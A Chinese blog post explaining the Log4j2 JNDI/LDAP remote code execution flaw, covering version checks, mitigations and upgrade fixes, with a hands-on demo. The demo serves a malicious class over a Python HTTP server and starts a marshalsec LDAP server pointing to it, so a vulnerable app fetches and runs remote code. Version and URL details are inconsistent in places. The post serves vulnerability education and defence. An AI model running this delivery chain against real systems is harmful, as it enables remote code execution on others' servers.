---
layout: post
title: 'log4j2 JNDI解析LDAP协议变量远程加载class存在漏洞（可被攻击执行任意代码）'
subtitle: '程序员圈子爆火的log4j2存在怎样的漏洞，如何攻？如何防？我们来一波攻防演示。'
background: '/img/posts/log4j2-jndi-ldap-remote-class-load-bug.png'
comment: false
---

# 目录

- [1. log4j2在程序员圈子火了-java程序员的不眠夜](#1)
    - [1.1 log4j日志简介](#1.1)
    - [1.2 判断是否使用有漏洞的log4j日志框架](#1.2)
    - [1.3 建议措施](#1.3)
- [2. 漏洞分析](#2)
- [3. 攻防演练](#3)
    - [3.1 攻](#3.1)
    - [3.2 防](#3.2)
    - [3.3 攻方"有道"](#3.3)
- [4. 引用](#4)

---

<h3 id="1">1. log4j2在程序员圈子火了-java程序员的不眠夜</h3>

2021年12月10日一觉醒来，发现程序员社交网站上全是`lo4j2`相关的内容。

实际上2021年11月24日，阿里云安全团队已经向Apache官方团队报告了`Apache Log4j2`远程代码执行漏洞。之后陆续国内多家机构监测到`Apache Log4j2`存在任意代码执行的漏洞。2021年12月10日阿里云再次报告官方`2.15-rc1`版本存在漏洞绕过，建议升级`2.15.0`版本。网上出现了`Apache Log4j2`任意远程代码执行漏洞的攻击代码，仿佛一夜间大家才紧张起来，也有网友感叹“第一次感受到互联网的脆弱”。

<h4 id="1.1">1.1 log4j日志简介</h4>

java有很多优秀的日志框架，并且设计是解耦的。接口层比如：`SL4j`、`Apache commons logging(JCL)`；实现层比如：`log4j`、`logbak`、`java util logging(JUL)`等。

`log4j`只是Apache出品的java日志框架的一种实现，所以不是说用了`Tomcat`就一定用了`log4j`框架输出日志，主要看应用是集成了哪种日志框架。

使用`sl4j` + `log4j2`需要在`pom.xml`中引入依赖：

```shell
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-log4j12</artifactId>
    <version>1.7.5</version>
</dependency>
```

> 本项目demo中没有使用`sl4j`，直接引入`log4j-api:2.14.1.jar`和`log4j-core:2.14.1.jar`。

简单的配置文件`log4j.properties`的demo如下：

```shell
#This is a log4j property
log4j.rootLogger=INFO, STDOUT
log4j.logger.deng=INFO
log4j.appender.STDOUT=org.apache.log4j.ConsoleAppender
log4j.appender.STDOUT.layout=org.apache.log4j.PatternLayout
log4j.appender.STDOUT.layout.ConversionPattern=%5p [%t] (%F\:%L) - %m%n
```

日志的级别分为：`All` < `Trace` < `Debug` < `Info` < `Warn` < `Error` < `Fatal`。

> `All`：最低层级，用于打开所有日志；`Trace`：表示程序推进；`Debug`；表示调试信息；`Info`：表示程序的运行过程；`Warn`：表示警告日志；`Error`：表示错误日志；`Fatal`：表示严重错误，将会导致应用程序退出。

更多java日志框架内容参考：[https://fengmengzhao.github.io/2018/06/12/detailed-explanation-of-java-logging-framework.html](https://fengmengzhao.github.io/2018/06/12/detailed-explanation-of-java-logging-framework.html)

<h4 id="1.2"> 1.2 判断是否使用有漏洞的log4j日志框架</h4>

`log4j`存在漏洞的版本是`2.x <= 2.15-rc1`。查看对应的依赖是否存在有漏洞版本即可。具体方法：

1. maven或者gradle构建项目，查看对应的配置文件，是否有相应的log4j依赖。
2. 非第三方构建项目，找到项目的依赖`CLASSPAHT`，查看是否有相应的log4j相关jar（`log4j-api:***.jar`、`log4j-core:***.jar`）包依赖。
3. 查看`CLASSPAHT`下是否有`log4j.properties`配置文件。

> 查看`CLASSPAHT`的办法可以用`ps -ef |grep $PID`，查到对应的进程信息里面`-cp`参数值为`classpath`。对于springboot项目可以使用命令`mkdir xxx && cd xxx && jar xvf ../xx.jar`解压后找到`lib`目录查看。

如果上面能够查到对应版本的jar包，很可能使用`log4j`作为日志框架，存在漏洞风险。

<h4 id="1.3">1.3 建议措施</h4>

- 正式方案
    - 下载官方最新稳定版本并升级，下载地址：[https://logging.apache.org/log4j/2.x/download.html](https://logging.apache.org/log4j/2.x/download.html)。
- 临时方案
    - 可升级jdk版本至`6u211`、`7u201`、`8u191`、`11.0.1`以上，可以在一定程度上限制JNDI等漏洞利用方式。
    - 对于大于2.10版本的Log4j，可设置系统属性`log4j2.formatMsgNoLookups`或者环境变量`LOG4J_FORMAT_MSG_NO_LOOKUPS`为`true`。
    - 对于2.0-beta9 to 2.10.0的版本，可以删除对应的`JndiLookup`类：`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`

> 针对上面临时方案中的升级JDK版本，本代码示例在Windows `JDK 1.8.0_212-b10`也能够成功复现攻击，所以最好按照正式方案解决问题。

<h3 id="2">2. 漏洞分析</h3>

`log4j`作为一个优秀的日志框架，提供了以某种约定的格式来获取到运行环境中配置信息的能力，称为`looksup`。例如提供了以下配置：

```shell
<properties>
    <property name="logPath">${sys.catalina.home}/xmlogs</property>
</properties>
```

后续在代码中就可以通过`${logPath}`来获取该属性的值。运行时`log4j`提供的`looksup`实现会解析`${`开头的变量，并且支持多种协议。例如通过`LDAP`查找变量；通过`docker`查找变量等，详细参考：[https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html](https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html)。

这次`log4j`的漏洞就是利用java的`jndi`API访问`LDAP`服务来远程加载类，攻击者可以写任意恶意远程代码在类加载的时候执行达到攻击目的。

代码层次分析参考：[https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg](https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg)

<h3 id="3">3. 攻防演练</h3>

<h4 id="3.1">3.1 攻</h4>

根据漏洞分析，我们想要模拟“攻”，需要准备4个东西：

1. 集成了log4j2的java项目。本示例：log4j的版本是`1.14.1`，JDK环境`1.8.0_121`。
2. 编译好的恶意`class`文件。本示例：恶意class文件在Windows环境运行**弹出计算器**，在Unix环境运行**列出运行环境监听的所有端口并生成图片test.jpg到程序运行目录**。
3. `LDAP`服务。本示例：使用`marshalsec-0.0.3-SNAPSHOT-all.jar`启动一个简单的`LDAP`服务。
4. 远程获取恶意class文件`http`服务。本示例：使用Python启动http服务，

从git上克隆项目到本地，github项目地址：[https://github.com/FengMengZhao/apache-log4j2-bug.git](https://github.com/FengMengZhao/apache-log4j2-bug.git)，gitee备份项目地址：[https://gitee.com/fengmengzhao/apache-log4j2-bug.git](https://gitee.com/fengmengzhao/apache-log4j2-bug.git)。

1). 导入maven项目到IDE中，或者使用`mvn`命令行下载maven依赖。

2). 将`Log4jRCE.java`类本地编译生成的class文件，该class文件即为恶意远程class文件，将该class提供为http可访问服务。可以将java和class文件copy到一个目录中，在该目录中启动简单的python http server：

> java源代码文件实际上并不需要，这里复制java源文件是为了验证http远程可访问。

```shell
#进入class文件所在的目录执行
/usr/bin/python3 -m http.server
```

服务端启动如图，默认端口是8000：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-remote-class-python-httpserver.png)

http访问java文件验证：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-remote-class-source-code-http-access.png)

3). 在项目`tool`目录下找到文件`marshalsec-0.0.3-SNAPSHOT-all.jar`，该jar包用于创建简单的`LDAP`服务。启动LDAP服务，默认监听`1389`端口号，需要指定2)中启动的远程http服务：

```shell
#可以在最后加上一个参数指定LDAP服务端口，模式是1389
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:port:8000/#Log4jRCE
```

启动`LDAP`服务后，默认监听`1389`端口，如图：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-ldap-service.png)

4). 执行`log4j`的main方法，即可验证攻击完成：

在Windows平台上运行，弹出计算器：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-win-invoke-calculator.png)

在Unix平台上运行，获取后台监听端口及进程，并将内容在运行目录生成`test.jpg`：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-unix-get-listen-port-and-generate-pic.jpg)

> 如果不能够成功复现攻击，报错`11:54:23.960 [main] ERROR log4j - Reference Class Name: foo`，可能是JDK版本过高。降低版本到`1.8.0_191`之下再尝试。

<h4 id="3.2">3.2 防</h4>

参考[1.3](#1.3)中的正式方案，将`log4j`版本升级到`2.15.0`，执行`log4j`的main方法不会再`jndi`远程加载class。

```shell
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.15.0</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.15.0</version>
</dependency>
```

> 如果是现场不方便重新打包，可将包下载，替换目标容器`lib`下对应的jar包。

<h4 id="3.3">3.3 攻方"有道"</h4>

<p style="color: red">本demo示例基于对技术的好奇和探索而创建，切忌用于线上生产项目的攻击！！！</p>

<h3 id="4">4. 引用</h3>

- [https://github.com/tangxiaofeng7/apache-log4j-poc](https://github.com/tangxiaofeng7/apache-log4j-poc)
- [https://help.aliyun.com/noticelist/articleid/1060971232.html](https://help.aliyun.com/noticelist/articleid/1060971232.html)
- [https://m.freebuf.com/articles/308151.html](https://m.freebuf.com/articles/308151.html)
- [https://logging.apache.org/log4j/2.x/download.html](https://logging.apache.org/log4j/2.x/download.html)
- [https://logging.apache.org/log4j/2.x/security.html](https://logging.apache.org/log4j/2.x/security.html)
- [https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg](https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg)

---
